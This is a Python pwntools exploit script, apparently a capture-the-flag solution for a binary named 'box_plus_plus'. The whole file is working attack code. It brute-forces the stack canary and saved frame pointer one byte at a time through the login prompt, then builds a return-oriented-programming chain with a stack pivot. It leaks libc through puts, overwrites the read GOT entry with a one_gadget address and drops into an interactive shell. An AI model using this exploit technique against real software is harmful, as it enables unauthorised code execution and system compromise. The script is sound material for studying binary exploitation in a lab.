# encoding: utf-8

from pwn import *

context.arch='amd64'
libc = ELF('./libc.so.6')
elf = ELF('./box_plus_plus')

def register(account, pw):
	r.sendlineafter('>', '1')
	r.sendafter(':', account)
	r.sendafter(':', pw)

def login(account, pw):
	r.sendlineafter('>', '2')
	r.sendafter(':', account)
	r.sendafter(':', pw)

def new(content):
	r.sendlineafter('>', '1')
	r.sendlineafter('>', content)

def update(idx, content):
	r.sendlineafter('>', '2')
	r.sendlineafter('?', str(idx))
	r.sendlineafter('>', content)

def delete(idx):
	r.sendlineafter('>', '4')
	r.sendlineafter('?', str(idx))

def logout():
	r.sendlineafter('>', '5')

def leak():
	register('a', '\x00')
	data = ''
	for _ in range(16):
		for ch in range(256):
			login('a', '\x00'*136+data+chr(ch))
			if 'successfully' in r.recvuntil('1.'):
				data += chr(ch)
				logout()
				break
	return data

r = process('./box_plus_plus')

data = leak()
canary = u64(data[:8])
rbp = u64(data[8:])
print "canary : ", hex(canary)
print "rbp : ", hex(rbp)

text_base = rbp-0x1220
print "text_base : ", hex(text_base)

login('a', '\x00'*136+data)
#DEBUG()
for i in range(8):
	new(str(i))
delete(6)
new('6'*232)

g_buf       = text_base + 0x202060
leave       = text_base + 0xb82
pop_rdi     = text_base + 0x1283
pop_rsi_r15 = text_base + 0x1281
pop_r12345  = text_base + 0x127c
call        = text_base + 0x1260

rop = flat(g_buf,
		   pop_rdi, text_base+elf.got['puts'], text_base+elf.plt['puts'],
           pop_r12345, text_base+elf.got['read'], 0, g_buf+0x98, 0x8, call) # 最多 232//8 == 29 個
 
update(7, ('a'*0x50 + rop).ljust(232) + flat(canary, g_buf+0x50, leave))
logout()
r.recvuntil('>\n')
libc_base = u64(r.recvn(6)+'\x00'*2)-libc.symbols['puts']
print "libc_base @ ", hex(libc_base)
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
one_shot = libc_base + one_gadget[2]

r.sendline(p64(one_shot))

r.interactive()